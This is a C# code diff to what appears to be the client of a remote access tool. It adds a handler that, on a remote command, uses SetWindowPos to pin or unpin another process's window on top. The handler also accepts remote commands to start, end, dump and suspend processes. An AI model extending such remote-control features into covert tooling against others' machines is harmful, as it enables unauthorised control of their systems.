@@ -17,6 +17,7 @@ using System.Management;
 using System.Net;
 using System.Reflection;
 using System.Threading;
+using System.Runtime.InteropServices;
 
 namespace Pulsar.Client.Messages
 {
@@ -50,6 +51,7 @@ namespace Pulsar.Client.Messages
                                                              message is DoProcessStart ||
                                                              message is DoProcessEnd ||
                                                              message is DoProcessDump ||
+                                                             message is DoSetTopMost ||
                                                              message is DoSuspendProcess;
 
         public bool CanExecuteFrom(ISender sender) => true;
@@ -73,6 +75,44 @@ namespace Pulsar.Client.Messages
                 case DoSuspendProcess msg:
                     Execute(sender, msg);
                     break;
+                case DoSetTopMost msg:
+                    Execute(sender, msg);
+                    break;
+            }
+        }
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+
+        private void Execute(ISender client, DoSetTopMost message)
+        {
+            try
+            {
+                Process proc = Process.GetProcessById(message.Pid);
+                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
+                {
+                    client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
+                    return;
+                }
+
+                const int HWND_TOPMOST = -1;
+                const int HWND_NOTOPMOST = -2;
+                const uint SWP_NOSIZE = 0x0001;
+                const uint SWP_NOMOVE = 0x0002;
+                const uint SWP_SHOWWINDOW = 0x0040;
+
+                IntPtr hWndInsertAfter = new IntPtr(message.Enable ? HWND_TOPMOST : HWND_NOTOPMOST);
+                bool result = Utilities.NativeMethods.SetWindowPos(
+                    proc.MainWindowHandle,
+                    hWndInsertAfter,
+                    0, 0, 0, 0,
+                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
+                );
+
+                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = result });
+            }
+            catch
+            {
+                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
             }
         }
 
